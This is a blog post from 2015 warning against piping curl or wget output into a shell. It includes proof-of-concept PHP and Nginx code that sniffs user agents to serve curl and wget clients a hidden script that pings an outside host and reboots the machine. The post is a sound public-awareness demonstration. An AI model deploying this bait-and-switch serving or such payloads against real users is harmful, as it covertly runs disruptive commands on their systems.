---
date: 2015-10-09T00:12:03Z
disqus: true
escape_code: true
share: true
title: Please Stop curl/wget'ing Directly to bash/sh
url: /2015/10/09/please-stop-curl-wgeting-directly-to-bash-sh/
---

Today, we are going to discuss the dangers of sending the output of a curl or wget command directly to your shell. There are already a few examples on why this is dangerous, with a very clear and concise example available <a href="https://www.seancassidy.me/dont-pipe-to-your-shell.html" target="_blank">here</a> that explains the dangers of connections closing or failing before the transfer is completed. However, I would like to present a much more malicious example. *Sinister, even!* I call it "The Bait-and-Switch."
  
Though this is certainly nothing groundbreaking or even new, this proof of concept is what I hope will end this ridiculous trend of piping downloaded scripts directly to your shell once and for all.
  
Take the following URL, for example: <a href="https://1a4.fr/speedtest/" target="_blank">https&#58;//1a4.fr/speedtest/</a>
  
In your browser, the above URL shows a perfectly functional bash script you can use to do some CLI speed tests from DigitalOcean test machines in each of their datacenters. This script will download a 100 MB test file to show basic throughput expectations, and then it will measure the average latency with a series of pings to each test machine. This script by itself is actually quite useful to someone on DigitalOcean or someone considering which datacenter(s) to use in a new setup.
  
Now, let's try to grab the same exact URL using `curl` or `wget` (but **NOT** piping to bash):
  
``` bash
curl https://1a4.fr/speedtest/
```
``` bash
wget -O- https://1a4.fr/speedtest/
```
  
What kind of sourcery is this, you ask? Well, let's just go straight into the explanation. Like I mentioned in the introduction, we wanted to show what happens when there's true malicious intent on the server side. To demonstrate this, a friend and I decided to implement two separate proof of concept solutions to achieve the same bait-and-switch end result. We'll first show his example, written in PHP (he has chosen to remain nameless so you don't associate him with PHP):
``` php
<?php

if (isset($_SERVER['HTTP_USER_AGENT']))
{
    $useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
}

if (!isset($useragent) || empty($useragent) || strpos($useragent, "curl") !== false || strpos($useragent, "wget") !== false)
{
    echo "#!/bin/sh\n";
    echo "#\n";
    echo "# If you are reading this, I fucked up or you pay attention to what you are doing. Friends don't let friends wget/curl into bash.\n";
    echo "# They don't prank them while they're working on their production networks either, so keep that in mind before you link to someone else.\n";
    echo "#\n";
    echo "# If you aren't reading this... well...\n";
    echo "#\n";
    echo "# Every host should have shutdown, right? They all run debian and ubuntu anyway...\n";
    echo " ping -q -s 90 -c 1 speedtest.gparent.org\n";
    echo "# We don't care if this works or not. We made our point\n";
    echo " shutdown -r now Attention all currently logged-in users - I have shutdown privileges and executed a shell script without reading its source code\n";
    echo "exit 0 # Exit cleanly. Very important.\n";
}
else
{
    header('Content-Type: text/plain');
    readfile("./script.sh");
}
?>
```
  
As you can see, this is an extremely basic script that will check the user agent string of the browser/client, and if it matches wget, curl or is blank, the malicious script will be presented as the output. Under any other conditions (browsers and some other downloaders that don't rely on wget or curl), the proper script will be presented to your browser, so you can feel all warm and fuzzy about "inspecting the source" before piping it directly to bash from curl/wget.
  
Here's the example I came up with using only Nginx to determine which of two files to serve (one malicious, one not):
  
``` nginx
## Proof of concept curl|sh bait and switch
location ~ ^/speedtest {
    index speedtest.txt;
    if ($http_user_agent !~* 'curl|wget') {
        root /home/speedtest;
    }
    root /home/speedtest/malicious;
}
```
  
This example is also quite simple, just like the above PHP version, but it requires only Nginx. To create the necessary directory structure, I created `/home/speedtest`, which contains `speedtest/speedtest.txt` and `malicious/speedtest/speedtest.txt` underneath it. I'm sure you can guess which one is the good script and which one is the bad. My example is only matching useragents that contain 'curl' or 'wget' in any case, but leaving any other ones untouched.
  
Easy, huh?
  
I hope our brief lesson has further implanted into your brain the dangers of piping scripts directly to your shell. Please do your civic duty and tell all your friends to watch out for assholes like myself and my anonymous researcher friend when moving about the interwebs, as you never know when we are out to prove a point (or concept)! We hope you will now at least think twice before piping scripts directly into your shell after downloading, and we'd be ecstatic if you *STOPPED DOING IT ALTOGETHER, BECAUSE IT'S JUST PLAIN STUPID*. This concludes our PSA.
